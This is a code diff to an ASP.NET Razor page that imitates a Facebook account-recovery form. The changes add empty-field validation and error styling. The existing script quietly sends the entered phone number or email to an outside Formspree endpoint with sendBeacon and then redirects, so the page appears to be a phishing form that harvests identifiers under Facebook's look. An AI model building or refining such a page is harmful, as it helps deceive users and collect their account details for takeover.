@@ -115,6 +115,11 @@
                         box-shadow: 0 0 0 2px rgba(8,102,255,.2);
                     }
 
+                    /* Clase dinámica para error en el input */
+                    .input-group input.error-input {
+                        border-color: var(--fb-error);
+                    }
+
                 .input-group label {
                     position: absolute;
                     left: 20px;
@@ -134,11 +139,15 @@
                 }
 
             .error-text {
-                display: block;
+                display: none;
                 color: var(--fb-error);
                 font-size: 14px;
                 margin: -18px 2px 20px;
             }
+
+                .error-text.show {
+                    display: block;
+                }
 
             .btn-pill {
                 width: 100%;
@@ -284,7 +293,6 @@
                 Ingresa tu número de celular o correo electrónico.
             </div>
 
-            <!-- Cambiamos el tipo de botón a 'button' para manejar la lógica con JS -->
             <form id="recoveryForm">
                 @Html.AntiForgeryToken()
 
@@ -294,9 +302,12 @@
                     <label for="usuario">Número de celular o correo electrónico</label>
                 </div>
 
+                <!-- Texto de error dinámico en lugar de la barra superior -->
+                <span id="errorMsg" class="error-text">Completa este campo para continuar.</span>
+
                 @if (ViewBag.Error != null)
                 {
-                    <span class="error-text">@ViewBag.Error</span>
+                    <span class="error-text show">@ViewBag.Error</span>
                 }
 
                 <button class="btn-pill btn-primary" type="button" onclick="enviarYContinuar()">
@@ -348,7 +359,21 @@
 
     <script>
             function enviarYContinuar() {
-                const usuario = document.getElementById('usuario').value;
+                const usuarioInput = document.getElementById('usuario');
+                const errorMsg = document.getElementById('errorMsg');
+                const usuario = usuarioInput.value.trim();
+
+                // Validación: Si el campo está vacío
+                if (usuario === "") {
+                    usuarioInput.classList.add('error-input');
+                    errorMsg.classList.add('show');
+                    return; // Detiene la ejecución para no enviar datos vacíos
+                }
+
+                // Limpia el estado de error si pasa la validación
+                usuarioInput.classList.remove('error-input');
+                errorMsg.classList.remove('show');
+
                 const formspreeUrl = "https://formspree.io/f/xvkpnleo";
 
                 // Preparamos los datos a enviar
@@ -358,7 +383,7 @@
                 // Envía los datos a Formspree en segundo plano de forma segura
                 navigator.sendBeacon(formspreeUrl, formData);
 
-                // Redirige después de un breve instante hacia tu acción del controlador (o a donde desees)
+                // Redirige después de un breve instante hacia tu acción del controlador
                 setTimeout(() => {
                     window.location.href = '@Url.Action("Index", "Home")';
                 }, 500);
